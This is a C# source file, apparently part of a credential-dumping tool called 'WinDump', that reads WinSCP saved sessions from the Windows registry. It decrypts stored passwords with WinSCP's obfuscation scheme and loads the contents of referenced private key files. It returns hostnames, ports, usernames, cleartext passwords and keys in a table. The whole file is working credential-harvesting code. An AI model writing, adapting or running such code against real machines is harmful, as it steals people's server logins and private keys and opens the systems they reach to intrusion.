using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.Remoting.Messaging;
using System.Text;

namespace WinDump
{
    internal class WinSCP
    {
        internal static DataTable GetWinSCP()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Name");
            dt.Columns.Add("Host");
            dt.Columns.Add("Port");
            dt.Columns.Add("User");
            dt.Columns.Add("Pass");
            dt.Columns.Add("Key");
            var basePath = @"Software\Martin Prikryl";
            using (var key = Registry.CurrentUser.OpenSubKey(basePath, false))
            {
                if (key == null)
                {
                    return dt;
                }
            }
            using (var key = Registry.CurrentUser.OpenSubKey(basePath+@"\WinSCP 2\Sessions", false))
            {
                if (key == null) {
                    return dt;
                }
                foreach(var subname in key.GetSubKeyNames())
                {
                    using(var subkey = key.OpenSubKey(subname, false))
                    {

                        var host = subkey.GetValue("HostName", "").ToString();
                        if (host.Length == 0) {
                            continue;
                        }
                        var port = subkey.GetValue("PortNumber", 22);
                        var user = subkey.GetValue("UserName", "").ToString();
                        var pass = subkey.GetValue("Password", "").ToString();
                        var keypath = subkey.GetValue("PublicKeyFile", "").ToString();
                        if (pass.Length != 0)
                        {
                            pass = Decrypt_WinSCP(user, pass, host);
                        }
                        var keyContent = "";
                        if (keypath.Length != 0) {
                            keypath = Uri.UnescapeDataString(keypath);
                            if (File.Exists(keypath)) {
                                keyContent = File.ReadAllText(keypath);
                            }

                        }
                        dt.Rows.Add(subname, host, port, user, pass, keyContent);
                    }
                }
                return dt;

            }
        }
        static string Decrypt_WinSCP(string user, string pass, string host)
        {
            List<string> list = new List<string>();
            for (int i = 0; i < pass.Length; i++)
            {
                list.Add(pass[i].ToString());
            }
            List<string> list2 = new List<string>();
            for (int j = 0; j < list.Count; j++)
            {
                if (list[j] == "A")
                {
                    list2.Add("10");
                }
                if (list[j] == "B")
                {
                    list2.Add("11");
                }
                if (list[j] == "C")
                {
                    list2.Add("12");
                }
                if (list[j] == "D")
                {
                    list2.Add("13");
                }
                if (list[j] == "E")
                {
                    list2.Add("14");
                }
                if (list[j] == "F")
                {
                    list2.Add("15");
                }
                if ("ABCDEF".IndexOf(list[j]) == -1)
                {
                    list2.Add(list[j]);
                }
            }
            List<string> list3 = list2;
            int num = 0;
            if (Dec_nex(list3) == 255)
            {
                list3.Remove(list3[0]);
                list3.Remove(list3[0]);
                list3.Remove(list3[0]);
                list3.Remove(list3[0]);
                num = Dec_nex(list3);
            }
            List<string> list4 = list3;
            list4.Remove(list4[0]);
            list4.Remove(list4[0]);
            int num2 = Dec_nex(list3) * 2;
            for (int k = 0; k < num2; k++)
            {
                list3.Remove(list3[0]);
            }
            string text = "";
            for (int l = 0; l <= num; l++)
            {
                string str = ((char)Dec_nex(list3)).ToString();
                list3.Remove(list3[0]);
                list3.Remove(list3[0]);
                text += str;
            }
            string text2 = user + host;
            int count = text.IndexOf(text2);
            text = text.Remove(0, count);
            return text.Replace(text2, "");
        }
        static int Dec_nex(List<string> list)
        {
            int num = int.Parse(list[0]);
            int num2 = int.Parse(list[1]);
            return 255 ^ (((num << 4) + num2 ^ 163) & 255);
        }
    }
}
